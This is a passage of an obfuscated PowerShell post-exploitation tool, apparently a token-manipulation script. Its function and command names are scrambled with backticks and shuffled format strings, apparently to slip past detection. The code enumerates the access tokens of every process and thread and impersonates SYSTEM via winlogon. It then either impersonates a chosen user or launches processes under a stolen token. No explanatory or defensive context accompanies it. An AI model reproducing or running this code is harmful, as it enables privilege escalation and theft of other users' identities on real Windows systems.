                if(${To`K`En}."iSE`lE`V`AtEd" -eq ${toKEN`B`YUser}[${K`eY}]."iS`eleva`TeD")
                {
                    if ((${Tok`EN}."privIL`eG`EsEN`Abled"."c`OuNT" + ${to`k`eN}."pR`iv`ilEGEsAV`Aila`BLe"."COu`NT") -gt (${tOkE`Nby`UseR}[${k`Ey}]."p`R`IvILeg`ESe`NABL`Ed"."c`OUNT" + ${tok`En`ByUsER}[${K`eY}]."pr`IviLe`G`ESa`V`AIlABLe"."CO`UNT"))
                    {
                        ${tokeNBY`U`s`ER}[${K`Ey}] = ${tO`k`eN}
                    }
                }
                
                elseif ((${TO`KEN}."ISe`leVA`TeD" -eq ${tr`UE}) -and (${tO`keNbyus`Er}[${K`ey}]."IsE`le`VAt`ED" -eq ${F`ALse}))
                {
                    ${t`oKENBY`U`Ser}[${K`EY}] = ${tO`ken}
                }
            }
        }

        
        foreach (${To`KEn} in ${aLLTO`kE`NS})
        {
            ${fUll`NA`mE} = "$($Token.Domain)\$($Token.Username)"

            
            foreach (${pr`IVi`lEge} in ${to`K`En}."PrI`ViLEGes`eN`A`BLEd")
            {
                if (${tO`k`eN`BYenabl`EdPr`iv}.("{0}{2}{1}" -f 'Contain','y','sKe').Invoke(${pRi`VIle`ge}))
                {
                    if(${TOkenb`ye`N`ABLe`dP`Riv}[${P`RIVIL`egE}] -notcontains ${fuLL`Na`me})
                    {
                        ${ToKE`NBYENAb`LedP`RiV}[${P`RI`VILege}] += ,${f`UlL`Name}
                    }
                }
                else
                {
                    ${TokeNb`YEN`Ab`lEDpriV}.("{0}{1}"-f 'Ad','d').Invoke(${pRIvi`le`Ge}, @(${FU`lln`AMe}))
                }
            }

            
            foreach (${PRIV`IL`e`GE} in ${To`KeN}."P`R`IvILegeS`AvAiL`AbLE")
            {
                if (${TokENBYAva`ILab`le`P`RIv}.("{3}{0}{1}{2}"-f'ai','n','sKey','Cont').Invoke(${PRIV`iLe`GE}))
                {
                    if(${ToKE`N`BYava`IlaBLeP`Riv}[${P`Ri`VIlEGe}] -notcontains ${f`Ul`L`NAme})
                    {
                        ${tOk`EnBYaVai`L`Able`pRiV}[${pRI`VILE`GE}] += ,${F`UL`lNaMe}
                    }
                }
                else
                {
                    ${toK`enbY`AvAIlAbL`E`pr`iV}.("{1}{0}"-f'd','Ad').Invoke(${Pr`IvI`l`eGE}, @(${fuL`L`NAme}))
                }
            }
        }

        ${re`T`UrndiCt} = @{
            ("{2}{1}{0}"-f 'nByUser','oke','T') = ${TOkE`NByU`seR}
            ("{3}{0}{4}{2}{1}{5}"-f 'o','ByEnab','n','T','ke','ledPriv') = ${T`ok`E`NbY`ENaBle`DpriV}
            ("{2}{1}{3}{0}" -f'v','ok','T','enByAvailablePri') = ${T`okENB`yA`VAi`laBL`EPRIV}
        }

        return (&("{1}{0}{2}" -f'-','New','Object') ("{0}{1}{2}" -f 'PS','Obje','ct') -Property ${rE`TU`RNDICT})
    }


    function InVoK`e-IMpERson`ATeU`sEr
    {
        Param(
            [Parameter(poSiTiON=0, ManDATory=${t`Rue})]
            [IntPtr]
            ${ht`Ok`en}
        )

        
        [IntPtr]${neWht`OK`En} =   $iL0Mt::"z`eRO"
        ${SU`Cc`ESS} = ${D`Upl`IcaTEto`kenex}."i`NVoKE"(${hTOK`eN}, ${WI`N3`2co`NStaNtS}."mAxImu`M_alLO`w`Ed",  ( iTem ("{1}{0}{3}{2}"-f 'iaBlE','VAR','L0mt',':i')).VAluE::"Ze`RO", 3, 1, [Ref]${nEWH`T`OKen}) 
        if (-not ${sUc`CESs})
        {
            ${eR`R`orCode} =   (vArIablE  ('a'+'2S')).VAlUE::("{1}{3}{0}{4}{2}" -f'tWi','G','r','etLas','n32Erro').Invoke()
            &("{2}{1}{0}{3}" -f'e-W','it','Wr','arning') ('D'+'up'+'lica'+'teTok'+'enEx'+' '+'faile'+'d. '+'Er'+'r'+'orCode'+': '+"$ErrorCode")
        }
        else
        {
            ${SUc`c`ESS} = ${I`mPE`R`S`oNaTElOgG`ED`oNuser}."iNv`OKE"(${ne`wH`TOken})
            if (-not ${suC`ce`ss})
            {
                ${ErrORc`o`dE} =   (  geT-ITEm ("var"+"iAble:"+"A2"+"s")  ).vALUE::("{0}{2}{1}{4}{5}{3}"-f'G','in','etLastW','or','32Er','r').Invoke()
                &("{1}{2}{0}" -f 'rning','Wr','ite-Wa') ('F'+'ailed '+'t'+'o '+'ImpersonateL'+'og'+'gedOnUs'+'e'+'r. '+'E'+'r'+'ror '+'c'+'ode:'+' '+"$Errorcode")
            }
        }

        ${Su`Cc`ess} = ${clO`sEHAn`dle}."i`Nv`OKe"(${N`EwHt`OKEN})
        ${n`ew`hToKeN} =  $il0mt::"zE`RO"
        if (-not ${Suc`CEsS})
        {
            ${eR`Ror`CoDE} =   $a2S::("{1}{3}{2}{0}" -f 'or','GetLas','Err','tWin32').Invoke()
            &("{2}{4}{0}{1}{3}" -f 'W','ar','Writ','ning','e-') ('Clo'+'seHand'+'le '+'f'+'ailed '+'to'+' '+'cl'+'ose '+'Ne'+'wHToke'+'n. '+'Err'+'o'+'rCode: '+"$ErrorCode")
        }

        return ${Su`C`Cess}
    }


    function CRe`Ate`-`PRO`CES`swiThToKen
    {
        Param(
            [Parameter(POSItION=0, ManDatoRy=${t`RuE})]
            [IntPtr]
            ${h`TOKen},

            [Parameter(POsITioN=1, mANdatORy=${T`RUe})]
            [String]
            ${pRo`CE`s`SName},

            [Parameter(pOsitIon=2)]
            [String]
            ${pR`OC`ES`SarGS},

            [Parameter(POSITIOn=3)]
            [Switch]
            ${PAS`StH`Ru}
        )
        &("{1}{0}{2}{3}"-f'ite','Wr','-Ve','rbose') ("{6}{5}{3}{4}{0}{2}{1}"-f '-ProcessW','thToken','i','ng Cre','ate','i','Enter')
        
        [IntPtr]${newH`T`okeN} =  (  GEt-item  ("VARIaB"+"le:Il0"+"mt") ).VAlUE::"Ze`Ro"
        ${s`U`ccess} = ${dupliCaTET`ok`eN`eX}."Inv`oKE"(${Ht`okEn}, ${W`IN3`2c`oNstA`NTS}."m`Ax`imum_AllowEd",  (GET-VariAble ("{0}{1}" -f'I','l0Mt') -vAluEOnLY)::"Ze`RO", 3, 1, [Ref]${n`e`Wh`ToKEN})
        if (-not ${SuC`cESS})
        {
            ${ER`ROr`C`oDe} =  $A2s::("{4}{5}{0}{2}{3}{1}" -f 'Wi','rror','n32','E','GetL','ast').Invoke()
            &("{1}{0}{3}{2}"-f'ni','Write-War','g','n') ('Du'+'plic'+'ateT'+'oke'+'nEx '+'fa'+'iled. '+'Er'+'ror'+'Code: '+"$ErrorCode")
        }
        else
        {
            ${s`T`ARtUpiNf`OSI`Ze} =  $a2S::"SizE`Of"([Type]${StArt`U`p`INFO})
            [IntPtr]${s`T`ARtUpINF`Optr} =  (  GEt-vaRiaBle  ('A2'+'S')  ).VaLUE::("{0}{2}{1}{3}" -f'A','o','llocHGl','bal').Invoke(${S`TA`RtUp`I`NF`OSize})
            ${Me`MsEt}."InV`OKE"(${St`Ar`TUp`INFopTR}, 0, ${staRtuP`I`NfO`SIzE}) | &("{0}{2}{1}" -f'Out-','ll','Nu')
             (  VaRiAble ("{1}{0}"-f 'S','A2')  -vALuE  )::("{0}{2}{1}" -f'W','2','riteInt3').Invoke(${staR`T`UpI`N`FopTr}, ${s`TAR`TupIN`Fos`iZe}) 

            ${pRocessi`NfO`s`IZE} =   $a2S::"sIz`EOF"([Type]${PR`oc`eSS_in`FORm`ATi`ON})
            [IntPtr]${P`ROc`e`ssiNfoptR} =  $a2S::("{1}{2}{0}"-f'l','Alloc','HGloba').Invoke(${pRoCE`SsiN`FoSI`ze})

            ${proCE`SSnAm`e`P`Tr} =  (  gci  ('VariaBL'+'e:'+'a2'+'s') ).value::("{2}{4}{0}{3}{1}" -f 'T','Uni','Stri','oHGlobal','ng').Invoke("$ProcessName")
            ${PRoCE`SsaR`GS`p`TR} =  ( vARiABLe ("{0}{1}"-f'il0','mT')).VAlUE::"Z`eRo"
            if (-not  ( GeT-iTEm ("{1}{0}{2}" -f'arIABle:W1Ik','v','U')).VaLuE::("{2}{1}{0}"-f'pty','lOrEm','IsNul').Invoke(${prOCE`SSA`RgS}))
            {
                ${Pr`oce`Ss`ArGSP`TR} =  (gET-vARIaBlE ('a'+'2s') -vAL)::("{0}{3}{1}{2}"-f 'Str','oHGlobalUn','i','ingT').Invoke(("`"$ProcessName`" "+"$ProcessArgs"))
            }
            
            ${FU`Nct`IoNnamE} = ""
            if (  (vaRIABLe ('SyRH'+'3P')  -valueonly )::("{5}{3}{4}{0}{2}{1}" -f 'rentPr','s','oces','t','Cur','Ge').Invoke()."ses`s`ioNid" -eq 0)
            {
                
                
                
                &("{3}{1}{0}{4}{2}"-f'-Ver','e','e','Writ','bos') ("{16}{35}{23}{9}{31}{8}{20}{30}{26}{4}{12}{18}{25}{22}{15}{29}{6}{28}{0}{14}{10}{32}{34}{19}{21}{7}{1}{17}{11}{33}{3}{5}{24}{13}{27}{2}"-f'AsU',' ','.','h alt','ken','erna','s','eate','abling SeAssignP','in Sessio','r','ocess w','Privileg','e','se','ateP','Ru','a pr','e','to','rima',' cr','alling Cre',' ','te tok',' and c','To','n','s','roce','ry','n 0. En','W','it',' ','nning')
                &("{3}{1}{0}{2}{4}" -f'able-Privil','n','e','E','ge') -Privilege ("{8}{4}{0}{6}{5}{7}{1}{3}{2}" -f 'ssig','oken','ilege','Priv','A','rim','nP','aryT','Se')
                ${s`U`cCEsS} = ${cr`eatEpr`Oc`e`SSASU`SErW}."i`N`VoKE"(${ne`wHt`Oken}, ${P`ROcE`SSnAMeP`TR}, ${PR`oCES`sargSp`TR},  (  Get-VaRIAbLe  ("{1}{0}" -f 'T','IL0M')  ).VaLUE::"Ze`RO",   (dIR  ('V'+'aRIa'+'bl'+'e:il0Mt')  ).VAlue::"ze`Ro", ${f`AlSE}, 0,   (  GET-CHILdITem ("{1}{0}{2}"-f 'L0M','vAriaBLE:I','T')  ).VALuE::"ze`Ro",  $Il0mt::"Z`eRo", ${s`Ta`R`TUPiN`FOpTr}, ${pr`OCE`SSINfopTR})
                ${fUn`CTi`onna`Me} = ("{5}{3}{4}{1}{2}{0}" -f 'serW','Process','AsU','t','e','Crea')
            }
            else
            {
                &("{2}{3}{4}{0}{1}" -f 'rbo','se','Wr','i','te-Ve') ("{11}{14}{3}{1}{0}{12}{4}{9}{5}{15}{10}{7}{6}{13}{8}{2}"-f 'essWit','0, calling CreateProc','en.','on ','TokenW',' crea','at','ss with altern',' tok',' to',' a proce','Not running in Ses','h','e','si','te')
                ${SU`c`cESs} = ${c`ReATE`PROceSsw`itHtOke`NW}."i`NvO`KE"(${n`EWH`TOKEN}, 0x0, ${PRoce`s`sNaMEP`Tr}, ${Proc`e`S`SarGsP`Tr}, 0,   ( GET-iTEM ("vA"+"riAble"+":IL0mt")).vaLUE::"zE`Ro",   $IL0MT::"Z`eRo", ${s`TARTupi`NFOptr}, ${P`RoCe`SSINfo`PTr})
                ${FUN`CT`iONNAmE} = ("{3}{0}{5}{2}{1}{4}" -f 'e','thT','rocessWi','Creat','okenW','P')
            }
            if (${sUc`ceSS})
            {
                
                ${P`R`oCe`sSinFo} =  $a2s::"pT`R`To`STruc`TUrE"(${PrOcessin`F`O`ptR}, [Type]${PRocess`_inF`ormA`T`ioN})
                ${c`l`OsEHa`NdLe}."In`VOKe"(${P`R`oc`ESSInFo}."hP`RoC`ess") | &("{1}{0}"-f 't-Null','Ou')
                ${cl`OsEHANd`LE}."i`NVOKe"(${ProCEs`s`iN`FO}."H`Thr`Ead") | &("{1}{0}{2}"-f 'u','Out-N','ll')

        
        if (${pA`sS`Thru}) {
            
            ${RetuRN`pr`O`CE`Ss} = &("{1}{0}{2}"-f 'et-Pro','G','cess') -Id ${Pr`oCes`s`Info}."dwP`Ro`cEs`SId"

            
            ${n`Ull} = ${Re`TUR`NP`ROc`eSs}."hAN`dLe"

            
            ${rE`T`URnPr`Oc`esS}
        }
            }
            else
            {
                ${eRR`O`RcO`de} =  ( get-vARIAbLE  ('a2'+'s') -Val )::("{2}{1}{0}{3}" -f 'tLastWin32Err','e','G','or').Invoke()
                &("{0}{2}{1}"-f'Write','ning','-War') ("$FunctionName "+'failed'+'.'+' '+'Erro'+'r '+'cod'+'e: '+"$ErrorCode")
            }

            
              ( get-VariABLe  ("a2"+"S")  -va )::("{1}{2}{0}{3}" -f'l','Fr','eeHG','obal').Invoke(${ST`A`RT`Up`INfOPTR})
            ${s`T`ArTupinF`O`ptr} =  (lS  ("VaRiAb"+"L"+"E:i"+"l0"+"MT")  ).Value::"z`ERO"
              (dir  ('VARiablE'+':'+'A2'+'S')).valUE::("{0}{1}{2}" -f'F','reeHGloba','l').Invoke(${pr`OC`e`ss`iNFOpTR})
            ${prOCESSinfo`p`TR} =  (gET-vaRiaBLe  ("il0m"+"T")  -VALueONLY)::"zE`RO"
             (  VarIaBLe  ("{0}{1}" -f 'a2','S')  ).vaLuE::("{6}{4}{7}{0}{5}{2}{3}{1}"-f 'bal','e','lo','cUnicod','oF','Al','Zer','reeGlo').Invoke(${Pr`o`ceSSN`AmEPTr})
            ${pR`OcessN`Am`e`ptR} =  $il0MT::"ze`Ro"

            
            ${S`Ucc`ESs} = ${CloS`EHA`ND`le}."I`NvOKE"(${neW`Hto`kEN})
            ${Ne`w`H`ToKen} =   $Il0mT::"ZE`Ro"
            if (-not ${S`Uc`cESS})
            {
                ${ErRor`c`ode} =  ( VArIABLE  ("A"+"2S")  ).VAlUe::("{2}{0}{1}{3}"-f'tW','in32Err','GetLas','or').Invoke()
                &("{2}{0}{1}" -f'rite-Wa','rning','W') ('Clo'+'seHan'+'dle '+'fai'+'led '+'to'+' '+'c'+'l'+'ose '+'NewHT'+'oken.'+' '+'Error'+'Co'+'de'+': '+"$ErrorCode")
            }
        }
    }


    function FR`E`E`-ALltOkEnS
    {
        Param(
            [Parameter(POsitIoN=0, manDATORy=${tr`Ue})]
            [PSObject[]]
            ${TOK`ENi`N`FOOb`js}
        )

        foreach (${O`BJ} in ${TOkE`NIn`FOoBJs})
        {
            ${suc`C`eSS} = ${CLOs`EHA`N`dle}."in`VoKE"(${o`Bj}."H`TOKEn")
            if (-not ${Su`CCess})
            {
                ${error`c`O`de} =   $a2s::("{3}{0}{1}{2}" -f'tWin','32Erro','r','GetLas').Invoke()
                &("{0}{1}{2}{3}"-f 'Wri','te-V','er','bose') ('Fail'+'ed'+' '+'t'+'o '+'cl'+'ose'+' '+'tok'+'en '+'han'+'dle'+' '+'i'+'n '+'F'+'ree-A'+'llTokens. '+'E'+'r'+'rorCode: '+"$ErrorCode")
            }
            ${O`BJ}."HTo`kEn" =  (iTEM ("V"+"ariAB"+"Le:i"+"L0m"+"T")).VALUE::"ZE`Ro"
        }
    }


    
    function e`N`UM-All`TOK`enS
    {
        ${A`lLT`OkeNs} = @()

        
        
        ${SYst`E`mtoK`ENiN`Fo} = &("{2}{0}{1}{4}{3}" -f'Pri','ma','Get-','oken','ryT') -ProcessId (&("{1}{0}{2}"-f '-Pr','Get','ocess') ("{1}{0}"-f'ninit','wi') | &("{0}{1}"-f'w','here') {${_}."seS`sI`oNID" -eq 0})."i`d"
        if (${SysTEMTokEn`i`NfO} -eq ${nu`lL} -or (-not (&("{3}{1}{0}{4}{2}"-f'onateU','ke-Impers','r','Invo','se') -hToken ${S`Y`S`TEMTOKENi`NfO}."HP`Ro`c`TokEn")))
        {
            &("{0}{2}{1}" -f'Wri','arning','te-W') ("{16}{7}{17}{0}{18}{9}{8}{10}{14}{11}{13}{3}{4}{20}{1}{6}{2}{5}{12}{19}{15}" -f 'rs','o',' be ab','s','cript will','le t','t','e to imp','S','ate ','YST',', ','o ','the ','EM','l tokens','Unabl','e','on','enumerate al',' n')
        }

        if (${s`YSt`emToK`eninfo} -ne ${n`ULL} -and ${sYsTe`mTOKEN`i`Nfo}."hpr`OC`T`oKen" -ne  (  get-VarIABLe  ('IL0'+'MT') ).vAlue::"Ze`Ro")
        {
            ${c`L`OSeH`ANDLe}."inv`o`kE"(${SyS`TEm`T`OKE`NinfO}."hpRoC`T`okEn") | &("{0}{2}{1}" -f'Out-','ll','Nu')
            ${S`ysTEMtokeNIN`FO} = ${NU`ll}
        }

        ${PrOC`e`SS`IdS} = &("{1}{0}{2}"-f 't-proce','ge','ss') | &("{1}{0}"-f'ere','wh') {${_}."nA`ME" -inotmatch "^csrss$" -and ${_}."N`AME" -inotmatch "^system$" -and ${_}."I`d" -ne 0}

        
        foreach (${P`R`OCess} in ${pRoCES`S`iDS})
        {
            ${PRiMA`R`ytok`e`NinFo} = (&("{0}{1}{2}{3}" -f 'Get-Pr','imaryT','ok','en') -ProcessId ${p`ROce`Ss}."iD" -FullPrivs)

            
            if (${pr`ImARY`TOKeniN`FO} -ne ${Nu`Ll})
            {
                [IntPtr]${HTok`en} = [IntPtr]${pr`iMARYT`o`k`eNi`NFo}."hpr`oCto`KEN"

                if (${H`T`OKen} -ne  $il0mT::"Z`Ero")
                {
                    
                    ${R`EtuR`NOBj} = &("{3}{4}{0}{1}{2}{5}"-f'-','TokenInfor','mat','Ge','t','ion') -hToken ${hTo`k`EN}
                    if (${r`et`UrNobJ} -ne ${nU`ll})
                    {
                        ${Re`TUr`NOBJ} | &("{2}{0}{1}"-f'd','d-Member','A') -MemberType ("{2}{0}{1}" -f'tePr','operty','No') -Name ("{1}{0}{2}" -f 'ocess','Pr','Id') -Value ${PrOc`E`SS}."I`d"

                        ${Al`LTOK`enS} += ${R`e`TUrNo`Bj}
                    }
                }
                else
                {
                    &("{1}{2}{0}{3}"-f'ite-Warni','W','r','ng') "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id) "
                }

                foreach (${T`hReAD} in ${P`R`OCESS}."THre`AdS")
                {
                    ${T`hREaDTok`eNi`N`Fo} = &("{2}{4}{3}{0}{1}"-f 'adT','oken','Ge','re','t-Th') -ThreadId ${TH`RE`AD}."I`D"
                    [IntPtr]${htok`en} = (${thRe`AdT`okE`NinFo}."H`T`hREadTokEn")

                    if (${htOK`en} -ne  (DIr ("{3}{0}{1}{2}" -f'l','E:il0M','T','VARiAb') ).ValUE::"zE`Ro")
                    {
                        ${re`TURN`oBj} = &("{4}{3}{0}{5}{1}{6}{2}"-f 'nInform','t','on','t-Toke','Ge','a','i') -hToken ${ht`ok`En}
                        if (${RetU`Rno`BJ} -ne ${nu`lL})
                        {
                            ${rETU`RnO`Bj} | &("{1}{0}{2}"-f'Memb','Add-','er') -MemberType ("{1}{2}{0}"-f 'ty','Note','Proper') -Name ("{0}{2}{1}" -f 'T','Id','hread') -Value ${tH`R`Ead}."ID"
                    
                            ${alLt`O`kenS} += ${reT`URN`o`BJ}
                        }
                    }
                }
            }
        }

        return ${a`lLTOK`Ens}
    }


    function I`NV`okE-`REvert`TOse`LF
    {
        Param(
            [Parameter(POsItioN=0)]
            [Switch]
            ${shO`woUTP`UT}
        )

        ${S`UcCE`sS} = ${rEVERtTO`s`e`lF}."in`VokE"()

        if (${shOw`ou`T`puT})
        {
            if (${Su`CC`eSs})
            {
                &("{1}{2}{0}" -f't','Writ','e-Outpu') "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
            else
            {
                &("{0}{2}{1}"-f'Write-Ou','t','tpu') "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
        }
    }


    
    function M`Ain
    {
        if (-not ([Security.Principal.WindowsPrincipal]   ( varIAbLe  ('IR6'+'vg'+'n')  -VAlUeon)::("{0}{1}{2}" -f'GetCur','ren','t').Invoke())."iS`INR`olE"([Security.Principal.WindowsBuiltInRole] ("{0}{2}{1}"-f 'Adminis','ator','tr')))
        {
            if (-not (${p`S`cm`Dlet}.ParaMetersEtname -ieq ("{0}{1}{2}"-f 'R','evT','oSelf'))){
                &("{1}{0}{2}" -f'ro','Write-Er','r') ("{2}{5}{0}{3}{1}{6}{4}" -f'ust be','run as a','Scr',' ','tor','ipt m','dministra') -ErrorAction ("{1}{0}"-f'p','Sto')
            }
        }

        
        if ( (ChIlDITeM ("{1}{3}{2}{0}"-f '3P','vAR','syrh','IABlE:') ).vaLUE::("{1}{0}{3}{2}{4}" -f 'n','GetCurre','r','tP','ocess').Invoke()."SeSSIO`N`id" -eq 0)
        {
            &("{1}{4}{2}{0}{3}"-f'bo','W','r','se','rite-Ve') (("{9}{3}{4}{5}{6}{11}{2}{8}{1}{10}{12}{7}{0}"-f've a UI)','s','ocesses in ','nning in Ses','sio','n 0, forcing NoUI',' (','nnot ha','Se','Ru','sion 0 ','pr','ca'))
            ${n`ouI} = ${tr`UE}
        }

        if (${psc`Md`leT}.PARaMetErSETnAMe -ieq ("{2}{3}{1}{0}" -f'elf','S','Rev','To'))
        {
            &("{0}{2}{1}{3}"-f 'In','RevertTo','voke-','Self') -ShowOutput
        }
        elseif (${Ps`C`MdLeT}.pARametERsetNAmE -ieq ("{3}{1}{2}{0}" -f 's','P','roces','Create') -or ${psc`m`Dlet}.ParamETErSeTnAMe -ieq ("{1}{0}{3}{2}" -f'son','Imper','er','ateUs'))
        {
            ${A`lLTOKe`NS} = &("{0}{2}{1}{3}"-f'Enum-A','lToke','l','ns')
            
            
            [IntPtr]${htok`EN} =  ( VaRIABLe  ("il0"+"MT")  -VALu )::"z`eRo"
            ${uniQ`UEtoK`ENS} = (&("{3}{1}{0}{2}"-f'niqueToken','et-U','s','G') -AllTokens ${ALL`To`KEns})."Token`BY`UseR"
            if (${us`E`RNaMe} -ne ${NU`ll} -and ${use`RNa`me} -ne '')
            {
                if (${UNi`qu`eTokENs}.("{0}{3}{2}{1}" -f 'C','ainsKey','t','on').Invoke(${usErNa`me}))
                {
                    ${h`TOKEn} = ${un`I`q`UeTokenS}[${usEr`NAMe}]."HT`OKeN"
                    &("{1}{4}{0}{3}{2}" -f 'b','Wr','se','o','ite-Ver') ("{4}{1}{3}{0}{2}{5}"-f'ng toke','ct','n by use','i','Sele','rname')
                }
                else
                {
                    &("{2}{1}{0}"-f'Error','rite-','W') "A token belonging to the specified username was not found. Username: $($Username) " -ErrorAction ("{0}{1}" -f 'Sto','p')
                }
            }
            elseif ( ${p`RO`c`esSid} -ne ${N`ULL} -and ${PR`O`cess`ID} -ne 0)
            {
                foreach (${t`OK`En} in ${alLTo`KE`Ns})
                {
                    if ((${T`OKeN} | &("{2}{1}{0}"-f'ber','m','Get-Me') ("{2}{1}{0}{3}"-f 'I','ess','Proc','d')) -and ${TOk`EN}."PROC`ES`siD" -eq ${P`RO`C`ESSiD})
                    {
                        ${Ht`o`Ken} = ${TO`ken}."HT`okEn"
                        &("{1}{0}{2}" -f 'r','W','ite-Verbose') ("{2}{0}{6}{5}{3}{1}{4}"-f 'g ','s','Selectin','ces','ID','o','token by Pr')
                    }
                }

                if (${HT`Ok`eN} -eq  ( ls  ("{0}{1}{2}{3}" -f'VAriABlE',':','il0','MT') ).VALUe::"zE`RO")
                {
                    &("{0}{1}{2}"-f 'Write','-Err','or') "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{1}{0}"-f'p','Sto')
                }
            }
            elseif (${THrea`d`id} -ne ${N`ULl} -and ${t`hr`EaDiD} -ne 0)
            {
                foreach (${t`oK`en} in ${aLl`To`K`enS})
                {
                    if ((${TOk`En} | &("{1}{2}{0}" -f 'Member','Get','-') ("{1}{2}{0}" -f 'd','Thread','I')) -and ${T`o`KeN}."tHr`EAD`iD" -eq ${T`hrEADId})
                    {
                        ${ht`O`Ken} = ${T`OKEN}."H`To`KEn"
                        &("{1}{2}{3}{0}" -f 'se','W','rite-Ver','bo') ("{6}{5}{2}{1}{4}{3}{0}"-f'hreadId','e','cting tok','T','n by ','e','Sel')
                    }
                }

                if (${ht`OKeN} -eq   ( gi ("{2}{0}{3}{1}{4}" -f 'I','E:il','vAR','aBL','0MT')).valUE::"zE`Ro")
                {
                    &("{2}{0}{3}{1}" -f 'ri','ror','W','te-Er') "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened. " -ErrorAction ("{0}{1}"-f 'St','op')
                }
            }
            elseif (${Pro`Ce`sS} -ne ${n`ULl})
            {
                foreach (${TO`KEN} in ${a`LL`ToKEns})
                {
                    if ((${to`k`EN} | &("{2}{0}{1}"-f 'e','t-Member','G') ("{0}{2}{1}"-f'Proc','ssId','e')) -and ${tOK`En}."P`RoC`eSSID" -eq ${P`RoceSS}."Id")
                    {
                        ${h`ToK`En} = ${TO`k`en}."Ht`O`ken"
                        &("{2}{1}{0}{3}"-f'ite','r','W','-Verbose') ("{0}{1}{5}{8}{4}{7}{2}{6}{9}{3}" -f 'Se','l','c',' object','ting token ','e','es','by Pro','c','s')
                    }
                }

                if (${ht`okEN} -eq   (vARiABLE  ("{0}{1}"-f 'IL','0Mt')).valUE::"zE`RO")
                {
                    &("{3}{2}{1}{0}"-f'e-Error','t','ri','W') "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{1}{0}"-f 'op','St')
                }
            }
            else
            {
                &("{1}{2}{3}{0}"-f'or','Writ','e-Er','r') ("{1}{9}{5}{4}{0}{6}{3}{7}{2}{8}" -f 'I','Mus','s ob',', ThreadId','me, Process','upply a Userna','d',', or Proces','ject','t s')  -ErrorAction ("{0}{1}" -f 'Sto','p')
            }

            
            if (${P`sC`mDLEt}.ParAmeterSeTNAmE -ieq ("{0}{3}{1}{2}" -f 'C','roce','ss','reateP'))
            {
                if (-not ${no`Ui})
                {
                    &("{1}{4}{0}{3}{2}" -f 'o','S','s','pACL','et-Deskt')
                }

                &("{2}{3}{0}{1}{5}{6}{4}"-f'es','s','Crea','te-Proc','oken','W','ithT') -hToken ${htO`Ken} -ProcessName ${CreAte`ProC`e`sS} -ProcessArgs ${PR`o`CESsa`RgS} -PassThru:${p`ASSTH`RU}

                &("{2}{3}{5}{0}{4}{1}" -f 'ert','oSelf','Invoke','-R','T','ev')
            }
            elseif (${IMPe`RS`oNATe`USER})
            {
                &("{2}{5}{1}{3}{0}{4}"-f'nateUse','e','Invoke-I','rso','r','mp') -hToken ${ht`Ok`En} | &("{2}{0}{1}"-f 'ut-N','ull','O')
                &("{2}{0}{1}" -f 'te-Outpu','t','Wri') "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }

            &("{2}{0}{3}{1}"-f 'lTok','ns','Free-Al','e') -TokenInfoObjs ${ALL`T`OKENS}
        }
        elseif (${Ps`cM`DL`eT}.PARAMetERseTnAmE -ieq ("{0}{2}{1}"-f 'Wh','AmI','o'))
        {
            &("{1}{2}{0}{3}" -f 't','Write-O','u','put') "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            ${aLL`To`KEns} = &("{3}{1}{2}{0}" -f'kens','-Al','lTo','Enum')

            if (${P`S`CMDlet}.paramEteRsETnAmE -ieq ("{0}{1}" -f 'ShowA','ll'))
            {
                &("{0}{2}{1}" -f 'W','Output','rite-') ${AlL`T`O`KeNS}
            }
            else
            {
                &("{0}{3}{2}{1}"-f'Wr','t','utpu','ite-O') (&("{2}{3}{4}{0}{1}" -f 'o','kens','Ge','t','-UniqueT') -AllTokens ${al`ltoK`Ens})."tO`kENBYus`er"."vAlU`Es"
            }

            &("{0}{2}{4}{5}{3}{1}" -f'I','Self','nvoke-R','To','eve','rt')

            &("{2}{1}{0}{3}" -f'e','Tok','Free-All','ns') -TokenInfoObjs ${al`ltOKe`NS}
        }
    }


    
    &("{0}{1}"-f'Mai','n')
}